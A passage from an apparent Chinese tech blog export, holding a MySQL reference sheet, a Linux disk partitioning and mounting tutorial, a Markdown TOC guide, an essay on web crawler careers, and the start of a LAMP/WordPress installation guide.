重置auto_increment的值。而delete不会3，truncate 不知道删除了几条，而delete知道。4，当被用于带分区的表时，truncate 会保留分区 备份与还原1234567891011121314151617181920备份，将数据的结构与表内数据保存起来。利用 mysqldump 指令完成。-- 导出mysqldump [options] db_name [tables]mysqldump [options] ---database DB1 [DB2 DB3...]mysqldump [options] --all--database1. 导出一张表 mysqldump -u用户名 -p密码 库名 表名 &gt; 文件名(D:/a.sql)2. 导出多张表 mysqldump -u用户名 -p密码 库名 表1 表2 表3 &gt; 文件名(D:/a.sql)3. 导出所有表 mysqldump -u用户名 -p密码 库名 &gt; 文件名(D:/a.sql)4. 导出一个库 mysqldump -u用户名 -p密码 --lock-all-tables --database 库名 &gt; 文件名(D:/a.sql)可以-w携带WHERE条件-- 导入1. 在登录mysql的情况下： source 备份文件2. 在不登录的情况下 mysql -u用户名 -p密码 库名 &lt; 备份文件 视图1234567891011121314151617181920212223242526272829什么是视图： 视图是一个虚拟表，其内容由查询定义。同真实的表一样，视图包含一系列带有名称的列和行数据。但是，视图并不在数据库中以存储的数据值集形式存在。行和列数据来自由定义视图的查询所引用的表，并且在引用视图时动态生成。 视图具有表结构文件，但不存在数据文件。 对其中所引用的基础表来说，视图的作用类似于筛选。定义视图的筛选可以来自当前或其它数据库的一个或多个表，或者其它视图。通过视图进行查询没有任何限制，通过它们进行数据修改时的限制也很少。 视图是存储在数据库中的查询的sql语句，它主要出于两种原因：安全原因，视图可以隐藏一些数据，如：社会保险基金表，可以用视图只显示姓名，地址，而不显示社会保险号和工资数等，另一原因是可使复杂的查询易于理解和使用。-- 创建视图CREATE [OR REPLACE] [ALGORITHM = &#123;UNDEFINED | MERGE | TEMPTABLE&#125;] VIEW view_name [(column_list)] AS select_statement - 视图名必须唯一，同时不能与表重名。 - 视图可以使用select语句查询到的列名，也可以自己指定相应的列名。 - 可以指定视图执行的算法，通过ALGORITHM指定。 - column_list如果存在，则数目必须等于SELECT语句检索的列数-- 查看结构 SHOW CREATE VIEW view_name-- 删除视图 - 删除视图后，数据依然存在。 - 可同时删除多个视图。 DROP VIEW [IF EXISTS] view_name ...-- 修改视图结构 - 一般不修改视图，因为不是所有的更新视图都会映射到表上。 ALTER VIEW view_name [(column_list)] AS select_statement-- 视图作用 1. 简化业务逻辑 2. 对客户端隐藏真实的表结构-- 视图算法(ALGORITHM) MERGE 合并 将视图的查询语句，与外部查询需要先合并再执行！ TEMPTABLE 临时表 将视图执行完毕后，形成临时表，再做外层查询！ UNDEFINED 未定义(默认)，指的是MySQL自主去选择相应的算法。 事务(transaction)123456789101112131415161718192021222324252627282930313233343536373839404142434445事务是指逻辑上的一组操作，组成这组操作的各个单元，要不全成功要不全失败。 - 支持连续SQL的集体成功或集体撤销。 - 事务是数据库在数据晚自习方面的一个功能。 - 需要利用 InnoDB 或 BDB 存储引擎，对自动提交的特性支持完成。 - InnoDB被称为事务安全型引擎。-- 事务开启 START TRANSACTION; 或者 BEGIN; 开启事务后，所有被执行的SQL语句均被认作当前事务内的SQL语句。-- 事务提交 COMMIT;-- 事务回滚 ROLLBACK; 如果部分操作发生问题，映射到事务开启前。-- 事务的特性 1. 原子性（Atomicity） 事务是一个不可分割的工作单位，事务中的操作要么都发生，要么都不发生。 2. 一致性（Consistency） 事务前后数据的完整性必须保持一致。 - 事务开始和结束时，外部数据一致 - 在整个事务过程中，操作是连续的 3. 隔离性（Isolation） 多个用户并发访问数据库时，一个用户的事务不能被其它用户的事物所干扰，多个并发事务之间的数据要相互隔离。 4. 持久性（Durability） 一个事务一旦被提交，它对数据库中的数据改变就是永久性的。-- 事务的实现 1. 要求是事务支持的表类型 2. 执行一组相关的操作前开启事务 3. 整组操作完成后，都成功，则提交；如果存在失败，选择回滚，则会回到事务开始的备份点。-- 事务的原理 利用InnoDB的自动提交(autocommit)特性完成。 普通的MySQL执行语句后，当前的数据提交操作均可被其他客户端可见。 而事务是暂时关闭“自动提交”机制，需要commit提交持久化数据操作。-- 注意 1. 数据定义语言（DDL）语句不能被回滚，比如创建或取消数据库的语句，和创建、取消或更改表或存储的子程序的语句。 2. 事务不能被嵌套-- 保存点 SAVEPOINT 保存点名称 -- 设置一个事务保存点 ROLLBACK TO SAVEPOINT 保存点名称 -- 回滚到保存点 RELEASE SAVEPOINT 保存点名称 -- 删除保存点-- InnoDB自动提交特性设置 SET autocommit = 0|1; 0表示关闭自动提交，1表示开启自动提交。 - 如果关闭了，那普通操作的结果对其他客户端也不可见，需要commit提交后才能持久化数据操作。 - 也可以关闭自动提交来开启事务。但与START TRANSACTION不同的是， SET autocommit是永久改变服务器的设置，直到下次再次修改该设置。(针对当前连接) 而START TRANSACTION记录开启前的状态，而一旦事务提交或回滚后就需要再次开启事务。(针对当前事务) 锁表123456表锁定只用于防止其它客户端进行不正当地读取和写入MyISAM 支持表锁，InnoDB 支持行锁-- 锁定 LOCK TABLES tbl_name [AS alias]-- 解锁 UNLOCK TABLES 触发器12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152触发程序是与表有关的命名数据库对象，当该表出现特定事件时，将激活该对象监听：记录的增加、修改、删除。-- 创建触发器CREATE TRIGGER trigger_name trigger_time trigger_event ON tbl_name FOR EACH ROW trigger_stmt参数：trigger_time是触发程序的动作时间。它可以是 before 或 after，以指明触发程序是在激活它的语句之前或之后触发。trigger_event指明了激活触发程序的语句的类型 INSERT：将新行插入表时激活触发程序 UPDATE：更改某一行时激活触发程序 DELETE：从表中删除某一行时激活触发程序tbl_name：监听的表，必须是永久性的表，不能将触发程序与TEMPORARY表或视图关联起来。trigger_stmt：当触发程序激活时执行的语句。执行多个语句，可使用BEGIN...END复合语句结构-- 删除DROP TRIGGER [schema_name.]trigger_name可以使用old和new代替旧的和新的数据更新操作，更新前是old，更新后是new.删除操作，只有old.增加操作，只有new.-- 注意1. 对于具有相同触发程序动作时间和事件的给定表，不能有两个触发程序。-- 字符连接函数concat(str1,str2,...])concat_ws(separator,str1,str2,...)-- 分支语句if 条件 then 执行语句elseif 条件 then 执行语句else 执行语句end if;-- 修改最外层语句结束符delimiter 自定义结束符号 SQL语句自定义结束符号delimiter ; -- 修改回原来的分号-- 语句块包裹begin 语句块end-- 特殊的执行1. 只要添加记录，就会触发程序。2. Insert into on duplicate key update 语法会触发： 如果没有重复记录，会触发 before insert, after insert; 如果有重复记录并更新，会触发 before insert, before update, after update; 如果有重复记录但是没有发生更新，则触发 before insert, before update3. Replace 语法 如果有记录，则执行 before insert, before delete, after delete, after insert SQL编程123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157--// 局部变量 ------------ 变量声明 declare var_name[,...] type [default value] 这个语句被用来声明局部变量。要给变量提供一个默认值，请包含一个default子句。值可以被指定为一个表达式，不需要为一个常数。如果没有default子句，初始值为null。-- 赋值 使用 set 和 select into 语句为变量赋值。 - 注意：在函数内是可以使用全局变量（用户自定义的变量）--// 全局变量 ------------ 定义、赋值set 语句可以定义并为变量赋值。set @var = value;也可以使用select into语句为变量初始化并赋值。这样要求select语句只能返回一行，但是可以是多个字段，就意味着同时为多个变量进行赋值，变量的数量需要与查询的列数一致。还可以把赋值语句看作一个表达式，通过select执行完成。此时为了避免=被当作关系运算符看待，使用:=代替。（set语句可以使用= 和 :=）。select @var:=20;select @v1:=id, @v2=name from t1 limit 1;select * from tbl_name where @var:=30;select into 可以将表中查询获得的数据赋给变量。 -| select max(height) into @max_height from tb;-- 自定义变量名为了避免select语句中，用户自定义的变量与系统标识符（通常是字段名）冲突，用户自定义变量在变量名前使用@作为开始符号。@var=10; - 变量被定义后，在整个会话周期都有效（登录到退出）--// 控制结构 ------------ if语句if search_condition then statement_list [elseif search_condition then statement_list]...[else statement_list]end if;-- case语句CASE value WHEN [compare-value] THEN result[WHEN [compare-value] THEN result ...][ELSE result]END-- while循环[begin_label:] while search_condition do statement_listend while [end_label];- 如果需要在循环内提前终止 while循环，则需要使用标签；标签需要成对出现。 -- 退出循环 退出整个循环 leave 退出当前循环 iterate 通过退出的标签决定退出哪个循环--// 内置函数 ------------ 数值函数abs(x) -- 绝对值 abs(-10.9) = 10format(x, d) -- 格式化千分位数值 format(1234567.456, 2) = 1,234,567.46ceil(x) -- 向上取整 ceil(10.1) = 11floor(x) -- 向下取整 floor (10.1) = 10round(x) -- 四舍五入去整mod(m, n) -- m%n m mod n 求余 10%3=1pi() -- 获得圆周率pow(m, n) -- m^nsqrt(x) -- 算术平方根rand() -- 随机数truncate(x, d) -- 截取d位小数-- 时间日期函数now(), current_timestamp(); -- 当前日期时间current_date(); -- 当前日期current_time(); -- 当前时间date('yyyy-mm-dd hh:ii:ss'); -- 获取日期部分time('yyyy-mm-dd hh:ii:ss'); -- 获取时间部分date_format('yyyy-mm-dd hh:ii:ss', '%d %y %a %d %m %b %j'); -- 格式化时间unix_timestamp(); -- 获得unix时间戳from_unixtime(); -- 从时间戳获得时间-- 字符串函数length(string) -- string长度，字节char_length(string) -- string的字符个数substring(str, position [,length]) -- 从str的position开始,取length个字符replace(str ,search_str ,replace_str) -- 在str中用replace_str替换search_strinstr(string ,substring) -- 返回substring首次在string中出现的位置concat(string [,...]) -- 连接字串charset(str) -- 返回字串字符集lcase(string) -- 转换成小写left(string, length) -- 从string2中的左边起取length个字符load_file(file_name) -- 从文件读取内容locate(substring, string [,start_position]) -- 同instr,但可指定开始位置lpad(string, length, pad) -- 重复用pad加在string开头,直到字串长度为lengthltrim(string) -- 去除前端空格repeat(string, count) -- 重复count次rpad(string, length, pad) --在str后用pad补充,直到长度为lengthrtrim(string) -- 去除后端空格strcmp(string1 ,string2) -- 逐字符比较两字串大小-- 流程函数case when [condition] then result [when [condition] then result ...] [else result] end 多分支if(expr1,expr2,expr3) 双分支。-- 聚合函数count()sum();max();min();avg();group_concat()-- 其他常用函数md5();default();--// 存储函数，自定义函数 ------------ 新建 CREATE FUNCTION function_name (参数列表) RETURNS 返回值类型 函数体 - 函数名，应该合法的标识符，并且不应该与已有的关键字冲突。 - 一个函数应该属于某个数据库，可以使用db_name.funciton_name的形式执行当前函数所属数据库，否则为当前数据库。 - 参数部分，由"参数名"和"参数类型"组成。多个参数用逗号隔开。 - 函数体由多条可用的mysql语句，流程控制，变量声明等语句构成。 - 多条语句应该使用 begin...end 语句块包含。 - 一定要有 return 返回值语句。-- 删除 DROP FUNCTION [IF EXISTS] function_name;-- 查看 SHOW FUNCTION STATUS LIKE 'partten' SHOW CREATE FUNCTION function_name;-- 修改 ALTER FUNCTION function_name 函数选项--// 存储过程，自定义功能 ------------ 定义存储存储过程 是一段代码（过程），存储在数据库中的sql组成。一个存储过程通常用于完成一段业务逻辑，例如报名，交班费，订单入库等。而一个函数通常专注与某个功能，视为其他程序服务的，需要在其他语句中调用函数才可以，而存储过程不能被其他调用，是自己执行 通过call执行。-- 创建CREATE PROCEDURE sp_name (参数列表) 过程体参数列表：不同于函数的参数列表，需要指明参数类型IN，表示输入型OUT，表示输出型INOUT，表示混合型注意，没有返回值。/* 存储过程 */ ------------------存储过程是一段可执行性代码的集合。相比函数，更偏向于业务逻辑。调用：CALL 过程名-- 注意- 没有返回值。- 只能单独调用，不可夹杂在其他语句中-- 参数IN|OUT|INOUT 参数名 数据类型IN 输入：在调用过程中，将数据输入到过程体内部的参数OUT 输出：在调用过程中，将过程体处理完的结果返回到客户端INOUT 输入输出：既可输入，也可输出-- 语法CREATE PROCEDURE 过程名 (参数列表)BEGIN 过程体END 用户与权限管理12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576-- root密码重置1. 停止MySQL服务2. [Linux] /usr/local/mysql/bin/safe_mysqld --skip-grant-tables &amp; [Windows] mysqld --skip-grant-tables3. use mysql;4. UPDATE `user` SET PASSWORD=PASSWORD("密码") WHERE `user` = "root";5. FLUSH PRIVILEGES;用户信息表：mysql.user-- 刷新权限FLUSH PRIVILEGES;-- 增加用户CREATE USER 用户名 IDENTIFIED BY [PASSWORD] 密码(字符串) - 必须拥有mysql数据库的全局CREATE USER权限，或拥有INSERT权限。 - 只能创建用户，不能赋予权限。 - 用户名，注意引号：如 'user_name'@'192.168.1.1' - 密码也需引号，纯数字密码也要加引号 - 要在纯文本中指定密码，需忽略PASSWORD关键词。要把密码指定为由PASSWORD()函数返回的混编值，需包含关键字PASSWORD-- 重命名用户RENAME USER old_user TO new_user-- 设置密码SET PASSWORD = PASSWORD('密码') -- 为当前用户设置密码SET PASSWORD FOR 用户名 = PASSWORD('密码') -- 为指定用户设置密码-- 删除用户DROP USER 用户名-- 分配权限/添加用户GRANT 权限列表 ON 表名 TO 用户名 [IDENTIFIED BY [PASSWORD] 'password'] - all privileges 表示所有权限 - *.* 表示所有库的所有表 - 库名.表名 表示某库下面的某表 GRANT ALL PRIVILEGES ON `pms`.* TO 'pms'@'%' IDENTIFIED BY 'pms0817';-- 查看权限SHOW GRANTS FOR 用户名 -- 查看当前用户权限 SHOW GRANTS; 或 SHOW GRANTS FOR CURRENT_USER; 或 SHOW GRANTS FOR CURRENT_USER();-- 撤消权限REVOKE 权限列表 ON 表名 FROM 用户名REVOKE ALL PRIVILEGES, GRANT OPTION FROM 用户名 -- 撤销所有权限-- 权限层级-- 要使用GRANT或REVOKE，您必须拥有GRANT OPTION权限，并且您必须用于您正在授予或撤销的权限。全局层级：全局权限适用于一个给定服务器中的所有数据库，mysql.user GRANT ALL ON *.*和 REVOKE ALL ON *.*只授予和撤销全局权限。数据库层级：数据库权限适用于一个给定数据库中的所有目标，mysql.db, mysql.host GRANT ALL ON db_name.*和REVOKE ALL ON db_name.*只授予和撤销数据库权限。表层级：表权限适用于一个给定表中的所有列，mysql.talbes_priv GRANT ALL ON db_name.tbl_name和REVOKE ALL ON db_name.tbl_name只授予和撤销表权限。列层级：列权限适用于一个给定表中的单一列，mysql.columns_priv 当使用REVOKE时，您必须指定与被授权列相同的列。-- 权限列表ALL [PRIVILEGES] -- 设置除GRANT OPTION之外的所有简单权限ALTER -- 允许使用ALTER TABLEALTER ROUTINE -- 更改或取消已存储的子程序CREATE -- 允许使用CREATE TABLECREATE ROUTINE -- 创建已存储的子程序CREATE TEMPORARY TABLES -- 允许使用CREATE TEMPORARY TABLECREATE USER -- 允许使用CREATE USER, DROP USER, RENAME USER和REVOKE ALL PRIVILEGES。CREATE VIEW -- 允许使用CREATE VIEWDELETE -- 允许使用DELETEDROP -- 允许使用DROP TABLEEXECUTE -- 允许用户运行已存储的子程序FILE -- 允许使用SELECT...INTO OUTFILE和LOAD DATA INFILEINDEX -- 允许使用CREATE INDEX和DROP INDEXINSERT -- 允许使用INSERTLOCK TABLES -- 允许对您拥有SELECT权限的表使用LOCK TABLESPROCESS -- 允许使用SHOW FULL PROCESSLISTREFERENCES -- 未被实施RELOAD -- 允许使用FLUSHREPLICATION CLIENT -- 允许用户询问从属服务器或主服务器的地址REPLICATION SLAVE -- 用于复制型从属服务器（从主服务器中读取二进制日志事件）SELECT -- 允许使用SELECTSHOW DATABASES -- 显示所有数据库SHOW VIEW -- 允许使用SHOW CREATE VIEWSHUTDOWN -- 允许使用mysqladmin shutdownSUPER -- 允许使用CHANGE MASTER, KILL, PURGE MASTER LOGS和SET GLOBAL语句，mysqladmin debug命令；允许您连接（一次），即使已达到max_connections。UPDATE -- 允许使用UPDATEUSAGE -- “无权限”的同义词GRANT OPTION -- 允许授予权限 表维护1234567-- 分析和存储表的关键字分布ANALYZE [LOCAL | NO_WRITE_TO_BINLOG] TABLE 表名 ...-- 检查一个或多个表是否有错误CHECK TABLE tbl_name [, tbl_name] ... [option] ...option = &#123;QUICK | FAST | MEDIUM | EXTENDED | CHANGED&#125;-- 整理数据文件的碎片OPTIMIZE [LOCAL | NO_WRITE_TO_BINLOG] TABLE tbl_name [, tbl_name] ... 杂项123456789101112131. 可用反引号（`）为标识符（库名、表名、字段名、索引、别名）包裹，以避免与关键字重名！中文也可以作为标识符！2. 每个库目录存在一个保存当前数据库的选项文件db.opt。3. 注释： 单行注释 # 注释内容 多行注释 /* 注释内容 */ 单行注释 -- 注释内容 (标准SQL注释风格，要求双破折号后加一空格符（空格、TAB、换行等）)4. 模式通配符： _ 任意单个字符 % 任意多个字符，甚至包括零字符 单引号需要进行转义 \'5. CMD命令行内的语句结束符可以为 ";", "\G", "\g"，仅影响显示结果。其他地方还是用分号结束。delimiter 可修改当前对话的语句结束符。6. SQL对大小写不敏感7. 清除已有语句：\c]]></content>
      <categories>
        <category>MySql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux的存储结构与磁盘划分]]></title>
    <url>%2F2018%2F08%2F08%2FLinux%E7%9A%84%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E7%A3%81%E7%9B%98%E5%88%92%E5%88%86%2F</url>
    <content type="text"><![CDATA[Linux系统遵循的一个原则就是”一切操作皆文件”.所以在Linux系统中，目录、字符设备、块设备、套接字、打印机等都被抽象成了文件。常见的硬件设备及其文件名称 硬件设备 文件名称 IDE设备 /dev/hd[a-d] SCSI/SATA/U盘 /dev/sd[a-p] 软驱 /dev/fd[0-1] 打印机 /dev/lp[0-15] 光驱 /dev/cdrom 鼠标 /dev/mouse 磁带机 /dev/st0或/dev/ht0 现在一般硬件设备都以“/dev/sd”开头。由于一台主机上可以有多块硬盘，因此系统采用a~p来代表16块不同的硬盘(默认从a开始分配)。而硬盘的分区编号的规则是： 1.主分区或扩展分区的编号从1开始，到4结束。2.逻辑分区从编号5开始。 下面分析一下”/dev/sda5 “这个设备文件名称都包含了哪些信息？ /dev : 保存了硬件设备文件的目录sd : 存储设备a : 系统中同类接口中第一个被识别到的设备5 : 分区中编号为5的一个逻辑分区 所以，总体而言，“ /dev/sda5 ” 就表示系统中第一块被识别到的硬件设备中分区编号为5的逻辑分区的设备文件。在创建磁盘分区时，用户一般会采用使用3个主分区加1个扩展分区的方法，然后在扩展分区中创建出数个逻辑分区，从而满足多分区的需求。为什么一定是3个主分区呢？因为主分区是不能超过4个的。然后我们可以通过下面的图例来看一下硬盘分区的规划。我们在使用Linux的过程中，有时候会遇到需要挂载，我们都知道需要用到mount命令，但是什么是挂载?什么时候需要挂载?挂载:当你需要使用硬盘设备或分区中的数据时候，需要先将其与一个已存在的目录文件进行关联，而此关联的过程就是挂载。根文件系统之外的其他文件要想能够被访问，都必须通过“关联”至根文件系统上的某个目录来实现，此关联操作即为“挂载”，此目录即为“挂载点”,解除此关联关系的过程称之为“卸载”。mount命令用于挂载文件系统，格式：mount 文件 挂载目录eg:1mount /dev/sdb2 /newfs 挂载点：mount_point，用于作为另一个文件系统的访问入口。作为挂载点应该具备以下条件: 1.事先存在 2.应该使用未被或不会被其它进程使用到的目录 3.挂载点下原有的文件将会被隐藏 我们可以用fdisk命令来管理硬盘设备。终端下输入123456789101112lengyue@ubuntu:~$ sudo fdisk -lDisk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisklabel type: dosDisk identifier: 0x25f0794b设备 启动 Start 末尾 扇区 Size Id 类型/dev/sda1 * 2048 39845887 39843840 19G 83 Linux/dev/sda2 39847934 41940991 2093058 1022M 5 扩展/dev/sda5 39847936 41940991 2093056 1022M 82 Linux 交换 / Solaris 当然此命令也是需要有管理员权限才能使用的。fdisk命令的参数: m : 获取帮助信息 n : 添加新的分区 p : 查看分区信息 w : 保存并退出 q : 不保存直接退出 d : 删除某个分区信息 l : 列出所有可用的分区类型 t : 改变某个分区的类型 先使用df -h选项来查看一下挂载状态和硬盘使用量信息。我们使用fdisk命令来管理/dev/sda硬盘设备。下面通过虚拟机进行添加硬盘设备模拟,我以个人的Ubuntu16.04(LTS)为例进行操作。首先关闭虚拟机中的系统,点击”编辑虚拟机设置”。然后点击”添加”，点击”下一步”。虚拟磁盘类型选择默认的SCSI(S)类型，然后点击”下一步”。点击”创建新虚拟磁盘(V)”,然后继续”下一步”。指定磁盘容量，你可以为其自定义容量。再次点击”下一步”后，即可看到新添加的硬盘。依照刚才说过的命名原则，刚才新增加硬盘将会被识别为/dev/sdb可以查看是否和我说的一样。1lengyue@ubuntu:~$ ls -l /dev/sdb 然后我们利用fdisk命令来管理硬盘设备，对刚添加的硬盘进行分区。输入参数”p”来查看一下当前硬盘设备内已有的分区信息。1lengyue@ubuntu:~$ sudo fdisk /dev/sdb 输入参数”n”开始添加新的分区。接着按照图示信息进行操作即可。从图中我们可以了解到已经成功创建了一个分区。然后利用file命令来查看一下该分区的信息。1lengyue@ubuntu:~$ file /dev/sdb1 这个时候我们需要先格式化硬盘,一块未经使用的硬盘，一定要先格式化，否则Linux系统是不知道怎么在其上写入数据的。如果你不格式化，在挂载时候你会得到如下的报错信息。123456lengyue@ubuntu:~$ sudo mount /dev/sdb1 /newfs/mount: wrong fs type, bad option, bad superblock on /dev/sdb1, missing codepage or helper program, or other error In some cases useful info is found in syslog - try dmesg | tail or so. 当然你需要先安装xfsprogs工具才能对硬盘进行格式化。1lengyue@ubuntu:~$ sudo apt install xfsprogs 开始格式化硬盘。1lengyue@ubuntu:~$ sudo mkfs.xfs /dev/sdb1 创建一个挂载点1lengyue@ubuntu:~$ sudo mkdir /newfs 然后开始进行挂载1lengyue@ubuntu:~$ sudo mount /dev/sdb2 /newfs 查看一下是否成功挂载。1lengyue@ubuntu:~$ df -h 看到如图所示的信息，就已经表明你已成功挂载了。运行上述命令后，即可立即使用已经挂载好的分区，但是系统重启后挂载就会失效，所以我们需要在每次开机后再次挂载一次。但是这样是十分麻烦的。我们可以通过修改配置文件来进行用永久性的挂载，而不必为重启失效而担心。下面就演示一下如何通过修改12```lengyue@ubuntu:~$ sudo gedit /etc/fstab 接下来，添加交换分区。SWAP(交换)分区是一种通过在硬盘中预先划分一定的空间，然后将把内存中暂时不常用的数据临时存放到硬盘中，以便腾出物理内存空间让更活跃的程序服务来使用的技术，其目的是解决真实物理内存不足的问题。交换分区的添加过程和和刚才的挂载管理硬件设备的过程是一样的。我只截图，就不给出命令了。使用mkswap命令对新建的主分区进行格式化操作。1lengyue@ubuntu:~$ sudo mkswap /dev/sdb2 我们先使用free命令来查看一下目前交换分区的情况。1lengyue@ubuntu:~$ free -m 然后开始挂载，将刚才创建的SWAP分区挂载到系统中。1lengyue@ubuntu:~$ sudo swapon /dev/sdb2 为了使新的交换分区设备在重启后依然生效，我们还是可以通过修改 /etc/fstab 配置文件，修改过程和修改方法和刚才的一样，把以下信息复制进最后一行即可，注意上下对齐。1/dev/sdb2 swap swap defaults 0 0 好了，基本就是这些了，如果哪里不懂，可以联系我讨论。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Markdown的toc语法]]></title>
    <url>%2F2018%2F08%2F06%2FMarkdown%E7%9A%84toc%E8%AF%AD%E6%B3%95%2F</url>
    <content type="text"><![CDATA[MarkDown 语法是当下非常流行的文本标记语言，它语法简便排版优美。目前很多博客都已经支持MarkDown语法编辑博客，比如我的这个博客就是全部用的markdown语法写的教程。著名的分布式系统社群 GitHub 也用MarkDown语法写README文件，当然准确而言，应该是GitHub Flavored Markdown（GFM）语法，该语法虽然是 GitHub在 Markdown语法基础 上扩充而来的，但一般情况下只要按照原本的Markdown语法进行描述就可以。最近在GitHub上写了一些东西，写README文件需要用到toc，所以就特地来记录一下。因为坑真的好多，README文件我写了一天才搞明白toc的用法细节。TOC：自动生成目录，其实就是设置锚点。你写的文件很大，你不可能一下子就可以看得完。所以就需要设置一个目录，来进行查询。点击该目录，即可索引到该部分内容上去。这个其实也即是锚点，百度百科上的分类就是一个个锚点。而markdown语法的锚点设置是非常严格的。 语法：12* [标题](#锚点)# 标题 与 []之间是有空格的。我发现在GitHub上只需一个空格，而在CSDN和本博客使用的hexo中需要2个空格。锚点中不能出现除-之外的任何字符，不能出现大写字母，可以出现汉字。也就是说锚点中只能出现小写字母、汉字、-这些字符。其余的全部是非法字符。这些很好理解，这种写法也是符合URL规范的。而且链接和锚点中的字母汉字必须保持一致，不能漏写，错写。空格用-代替若是链接中出现（）？等特殊字符，直接省略不写即可。但是字母(数字汉字英文)必须写出来。例：1* [46 Python和多线程（multi-threading）。这是个好主意吗？列举一些让Python代码以并行方式运行的方法。](#46-python和多线程multi-threading这是个好主意吗列举一些让python代码以并行方式运行的方法) 本例中，可以看到出现了大写字母，汉字和特殊字符，但是均做了处理。 如果你设置分级锚点，需要在分级锚点处空至少2格出来。例：1234567* [目录 1](#目录-1) * [目录 2](#目录-2) * [目录 3](#目录-3)...此处省略1000字...## 目录1### 目录2#### 目录3 示例: 目录 1 目录 2 目录 3目录 1目录 2目录 3 演示效果： 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>GitHub</category>
      </categories>
      <tags>
        <tag>GitHub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为什么网上Python教程这么多，但是做爬虫的这么少呢?]]></title>
    <url>%2F2018%2F08%2F06%2F%E4%B8%BA%E4%BB%80%E4%B9%88%E7%BD%91%E4%B8%8APython%E6%95%99%E7%A8%8B%E8%BF%99%E4%B9%88%E5%A4%9A%EF%BC%8C%E4%BD%86%E6%98%AF%E5%81%9A%E7%88%AC%E8%99%AB%E7%9A%84%E8%BF%99%E4%B9%88%E5%B0%91%E5%91%A2%2F</url>
    <content type="text"><![CDATA[很多人学习Python进阶可能都写过几个爬虫，但是最终做爬虫的人却比较少，是什么原因导致的呢？是爬虫真的没“技术含量”，还是随着反爬的不断提升，做爬虫的代价越来越高难以维持成本？网上的确有很多Python教程，因为只考虑爬虫逻辑的话，爬虫逻辑很简单，无非就是构造请求、发送请求、解析响应、获得数据，可能几行代码就搞定了，因为简单，而且获得的数据又很好展示，所以网上才会有很多简单的爬虫教程，即使教了，也只是教怎么用Python模拟请求和搜索DOM，最多只能算是真正做爬虫的基础问题。实际上做爬虫，关键问题永远不是怎么去模拟请求这件事。一个强大的爬虫，涉及到很多学科的知识，是一门很大的学问。要懂得HTTP协议，知道哪个协议可以帮助节省带宽和时间；要了解数据库知识，不然怎么优化、存储数据？数据库分布式总要懂一点，不然爬虫怎么协作呢？要学习算法，基本的调度算法、爬虫调度需要了解；要学习JavaScript，数据是怎么处理的，如何反向解析这些数据等等。 基础爬虫很简单，普通的开发都能通过很短的时间学习并胜任简单的爬虫任务，前后端数据分析工程师，时不时都能写点爬虫；对于复杂爬虫而言，如何进行进行大规模数据的爬取和存储或者如何绕过复杂的认证，都不是轻易就可以搞定的，需要熟悉分布式的架构和使用、网络底层协议、各类网站前后端架构及数据加密方式，甚至要有网络安全攻防的功底，大规模数据爬虫的技术难度是成倍增加的，网上的基础教程哪里会教这些？ 有业内人士表示：爬虫的本质是下载数据。但重要的是数据本身，而不是如何去下载数据，真正的、专业的爬虫，是泡在搜索引擎的数据中心里，直接读缓存的。 在业务上，爬虫的需求虽不少，但专职做爬虫的却不多，对一般公司来讲，无论从哪个方向来看，数据的爬取都不是工作重点，如果不是完全靠数据驱动的公司，对于数据的需求并没那么大，也并不需要专人专岗来写爬虫。只会用Python模拟请求，这样的岗位说难听点叫做伪岗位，就算是靠着写爬虫吃饭，大体上也吃的不太好，最好的出路其实是开课教别人做爬虫。 所以说，学习爬虫是需要很多知识的，你在网上所看到的那些视频等教程，也只是为了培训而做的，那算不得真正意义上的爬虫。那只是提取网页信息而已。而且可以从本文中看到，你需要的知识是很多的，不仅仅需要python知识。所以说：任重而道远。同学们，好好学习吧。]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LAMP环境下搭建word press个人博客]]></title>
    <url>%2F2018%2F08%2F04%2FLAMP%E7%8E%AF%E5%A2%83%E4%B8%8B%E6%90%AD%E5%BB%BAword-press%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[本次也只是在本地环境下进行测试而已，当然你在自己的服务器上也是完全可以这么做的。环境：Ubuntu16.04(LTS)首先搭建LAMP环境。 安装 Apache2在终端输入以下命令安装 Apache2。1sudo apt-get install apache2 -y 安装好后，打开浏览器，地址栏输入 http://127.0.0.1/看到如下界面即成功安装。 安装 PHP1sudo apt-get install php7.0 -y 但是需要提示一下，你若是利用其他的网站系统来搭建的时候，需要注意那个网站模板系统支持的PHP版本，我这里安装PHP7.0就可以。还要提醒一句，PHP7.0的版本已经在apt软件库了，所以可以直接用apt install安装。但是并不是所有版本都在，如果不在，就去官网下载，然后自己安装依赖。安装 php 相关组件1sudo apt-get install libapache2-mod-php7.0 安装 MySQL 服务1sudo apt-get install mysql-server -y 安装过程中，会要你输入 MySQL 的密码，你需要输入两次密码，并记住你输入的密码。 安装 php MySQL相关组件：1sudo apt-get install php7.0-mysql 为 wordpress 配置一个数据库。终端下输入以下命令,然后会提示你输入设置的MySQL密码。1mysql&gt; mysql -u root -p 为 wordpress 创建一个叫 wordpress 的数据库1mysql&gt; CREATE DATABASE wordpress; 可以查看一下刚才创建的数据库1mysql&gt; SHOW DATABASE; 为这个数据库设置一个用户为 wordpress_user1mysql&gt; CREATE USER wordpress_user; 为这个用户配置一个密码为123456789(密码改为你自己设的，一定不要使用我这种弱口令密码，我只是为了测试而已)1mysql&gt; SET PASSWORD FOR wordpress_user= PASSWORD(&quot;123456789&quot;); 